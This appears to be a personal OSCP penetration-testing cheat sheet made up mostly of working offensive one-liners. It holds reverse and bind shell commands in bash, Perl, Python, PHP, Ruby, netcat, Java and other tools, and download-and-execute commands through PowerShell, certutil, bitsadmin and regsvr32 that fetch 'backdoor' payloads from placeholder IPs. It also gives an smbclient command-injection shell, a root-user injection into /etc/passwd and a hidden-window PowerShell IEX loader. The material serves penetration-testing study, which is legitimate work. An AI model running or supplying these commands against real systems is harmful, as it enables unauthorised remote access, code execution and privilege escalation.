# OSCP learning


## Reference

* [windows exploit](https://github.com/abatchy17/WindowsExploits)
* [OSCP like vulnhub](https://medium.com/@andr3w_hilton/oscp-training-vms-hosted-on-vulnhub-com-22fa061bf6a1)
* [OSCP official report](https://www.offensive-security.com/pwk-online/PWK-Example-Report-v1.pdf)
* [smb enumerate](https://xax007.github.io/2019-01-12-smb-enumeration-checklist/)
* [pentestmonkey reverse shell](http://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet)
* [python pty shell](https://github.com/infodox/python-pty-shells)
* [linux priv check](https://raw.githubusercontent.com/neal1991/htb/62d6df2d86669a2957418e74c3a79a535297f386/SolidState/linuxprivchecker.py)
* [upgrade reverse shell](https://blog.ropnop.com/upgrading-simple-shells-to-fully-interactive-ttys/)


## cheetsheet 

### Enumerate

* droopescan

### Brute Force

#### Dictionary

Scan to a depth of 2 (-d 2) and use a minimum word length of 5 (-m 5), save the words to a file (-w docswords.txt), targeting the given URL (https://example.com):

```
cewl -d 2 -m 5 -w docswords.txt https://example.com
```

### linux privilege escalation

#### search SUID 

`find / -type f -perm -u=s 2>/dev/null`

`find / -perm -4000 2>/dev/null`

#### writeable passwd

```shell
# generate password firstly
openssl passwd -1

# then make up the passwd for user neal
neal:yourgeneratedstring:0:0:neal:/root/bin/bash

# write to passwd, save the above string to a file passwd
# I don't understand why base64, base64 comes nothing. 
# I don't know if it can escape from the HIDS.
# Seems it just want to hide the bash_hisrtory from the system admin but it must be stupid.
cat passwd | base64 -w 0   

echo generated_base64 | base64 -d >> /etc/passwd
```

### check running process

https://github.com/DominicBreuker/pspy


### windows privilege escalation
 * [windows 内核利用](https://github.com/51x/WHP)
 * [windows 提权常见步骤](https://www.absolomb.com/2018-01-26-Windows-Privilege-Escalation-Guide/)


### File transfer

#### nc

```
Receiver:
nc -lnvp 1235 | base64 -d > binaryfile

Sender:
base64  binaryfile | nc -w 3 10.10.15.130 1235
````

#### python

```python
python -m SimpleHTTPServer 80
```

#### php 5.4+

```php
php -S 0.0.0.0:80
```

#### ruby

```ruby
ruby -rwebrick -e'WEBrick::HTTPServer.new(:Port => 1337, :DocumentRoot => Dir.pwd).start'
```

#### runby 1.9.2+

```ruby
 ruby -run -e httpd . -p 1337
 ```
 
 #### perl
 
 ```perl
perl -MHTTP::Server::Brick -e '$s=HTTP::Server::Brick->new(port=>1337); $s->mount("/"=>{path=>"."}); $s->start'
```

```perl
perl -MIO::All -e 'io(":8080")->fork->accept->(sub { $_[0] < io(-x $1 +? "./$1 |"
```

### Download Files

#### powershell: download and execute

```powershell
powershell (new-object System.Net.WebClient).DownloadFile('http://1.2.3.4/5.exe','c:\download\a.exe');start-process 'c:\download\a.exe'
```

#### certutil: download and execute

```
certutil -urlcache -split -f http://1.2.3.4/5.exe c:\download\a.exe&&c:\download\a.exe
```

#### bitsadmin：download and execute 

```
bitsadmin /transfer n http://1.2.3.4/5.exe c:\download\a.exe && c:\download\a.exe
```

#### regsvr32

```
regsvr32 /u /s /i:http://1.2.3.4/5.exe scrobj.dl
```

#### curl 

```
curl http://1.2.3.4/backdoor
```

#### wget

```
wget http://1.2.3.4/backdoor -O /yourpath/backdoor
```

#### awk

```
awk 'BEGIN {
  RS = ORS = "\r\n"
  HTTPCon = "/inet/tcp/0/127.0.0.1/1337"
  print "GET /secret.txt HTTP/1.1\r\nConnection: close\r\n"    |& HTTPCon
  while (HTTPCon |& getline > 0)
      print $0
  close(HTTPCon)
}'
```
[more](https://xax007.github.io/2019-01-13-post-exploitation-file-transfer-tips/)

### Pop shell

#### smbclient

```
logon "./=`nohup nc 10.10.16.44 1234 -e /bin/bash`"
```

#### Bash 

Some versions of bash can send you a reverse shell (this was tested on Ubuntu 10.10):

`bash -i >& /dev/tcp/10.0.0.1/8080 0>&1`

#### PERL 

```perl
perl -e 'use Socket;$i="10.0.0.1";$p=1234;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};'
```

#### Python(2.7)

```python 
python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.0.0.1",1234));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'
```

#### PHP

`php -r '$sock=fsockopen("10.0.0.1",1234);exec("/bin/sh -i <&3 >&3 2>&3");'`

#### Ruby

`ruby -rsocket -e'f=TCPSocket.open("10.0.0.1",1234).to_i;exec sprintf("/bin/sh -i <&%d >&%d 2>&%d",f,f,f)'`

#### Netcat

​	on Windows

```shell
#bindShell
	nc -nvlp 4444 -e cmd.exe
#reverseShell
	nc -n 10.11.22.31 4444 -e cmd.exe
```

​	on Linux

```shell
#bindShell
	nc -nvlp 4444 -e /bin/sh	
#reverseShell
	nc -nv 10.11.22.31 4444 -e /bin/bash

#without -e:
	rm -f /tmp/f; mkfifo /tmp/f
#bindShell:
	cat /tmp/f | /bin/bash -i 2>&1 | nc -nvlp 4444 > /tmp/f
#reverShell:
	cat /tmp/f | /bin/bash -i 2>&1 | nc -n 10.11.22.3 4444 > /tmp/f

#Or try:
#bind port 4444 on your target
	nc -nvlp 4444 | /bin/bash
#Connect to the port 4444 from attacking machine (As input)
	nc -nv [victim ip] 4444
#And using another window to listen on local 7777 run (As output):
	/bin/bash | nc -n 10.11.0.71 7777
#And you can also change it to reverse mode
```

#### telnet

```shell
# On linux this approach seems to nc without -e
nc -lvp 4444    # Attacker. Input (Commands)
nc -lvp 4445    # Attacker. Ouput (Results)
telnet [atackers ip] 4444 | /bin/sh | [local ip] 4445
```

#### Java

```java
r = Runtime.getRuntime()
p = r.exec(["/bin/bash","-c","exec 5<>/dev/tcp/10.0.0.1/2002;cat <&5 | while read line; do \$line 2>&5 >&5; done"] as String[])
p.waitFor()
```

#### xterm 

`xterm -display 10.0.0.1:1`


### Upgrade your Shell 
```
```


### nmap 

#### port probing

```
nmap --min-rtt-timeout=1 -p- -A 10.1.1.1
```

```
nmap --min-rtt-timeout=1 -p- -sU -sV 10.1.1.1
```

```
nmap -sT -p- --min-rate 10000 -oA scans/nmap-alltcp 10.10.10.5
```

```
nmap -sV -sC -p 21,80 -oA scans/nmap-scripts 10.10.10.5
```

#### NSE script scanning (脚本扫描)

* [FluentNamp](https://github.com/JohnRyk/FluentNmap)


### 杂项

#### python ASCII to exe or elf
```
# 需要安装 pyinstaller 和 pywin32
	...
```

```
# Python3:
	python3 -m pip install pyinstaller
	pyinstaller -F test.py				# -F (one single file)
	
# 在x86windows环境下将生产x86的exe, 在x86_64的linux环境下会生产x86_64的ELF，目标文件位于dist文件夹下。
```
#### Cross Compile


#### 编译 windows 执行程序

```
i686-w64-mingw32-gcc -o scsiaccess.exe useradd.c
```

#### powershell 无窗口模式

```
Powershell.exe -NoProfile -NonInteractive -WindowStyle Hidden -ExecutionPolicy Bypass IEX (New-Object Net.WebClient).DownloadString(‘[PowerShell URL]’); [Parameters]
```

### buffer overflow

#### all ascii hex

```hex
\x00\x01\x02\x03\x04\x05\x06\x07\x08\x09\x0a\x0b\x0c\x0d\x0e\x0f\x10\x11\x12\x13\x14\x15\x16\x17\x18\x19\x1a\x1b\x1c\x1d\x1e\x1f\x20\x21\x22\x23\x24\x25\x26\x27\x28\x29\x2a\x2b\x2c\x2d\x2e\x2f\x30\x31\x32\x33\x34\x35\x36\x37\x38\x39\x3a\x3b\x3c\x3d\x3e\x3f\x40\x41\x42\x43\x44\x45\x46\x47\x48\x49\x4a\x4b\x4c\x4d\x4e\x4f\x50\x51\x52\x53\x54\x55\x56\x57\x58\x59\x5a\x5b\x5c\x5d\x5e\x5f\x60\x61\x62\x63\x64\x65\x66\x67\x68\x69\x6a\x6b\x6c\x6d\x6e\x6f\x70\x71\x72\x73\x74\x75\x76\x77\x78\x79\x7a\x7b\x7c\x7d\x7e\x7f\x80\x81\x82\x83\x84\x85\x86\x87\x88\x89\x8a\x8b\x8c\x8d\x8e\x8f\x90\x91\x92\x93\x94\x95\x96\x97\x98\x99\x9a\x9b\x9c\x9d\x9e\x9f\xa0\xa1\xa2\xa3\xa4\xa5\xa6\xa7\xa8\xa9\xaa\xab\xac\xad\xae\xaf\xb0\xb1\xb2\xb3\xb4\xb5\xb6\xb7\xb8\xb9\xba\xbb\xbc\xbd\xbe\xbf\xc0\xc1\xc2\xc3\xc4\xc5\xc6\xc7\xc8\xc9\xca\xcb\xcc\xcd\xce\xcf\xd0\xd1\xd2\xd3\xd4\xd5\xd6\xd7\xd8\xd9\xda\xdb\xdc\xdd\xde\xdf\xe0\xe1\xe2\xe3\xe4\xe5\xe6\xe7\xe8\xe9\xea\xeb\xec\xed\xee\xef\xf0\xf1\xf2\xf3\xf4\xf5\xf6\xf7\xf8\xf9\xfa\xfb\xfc\xfd\xfe\xff
```

#### common ascii - hex  
```shell
man ascii
```
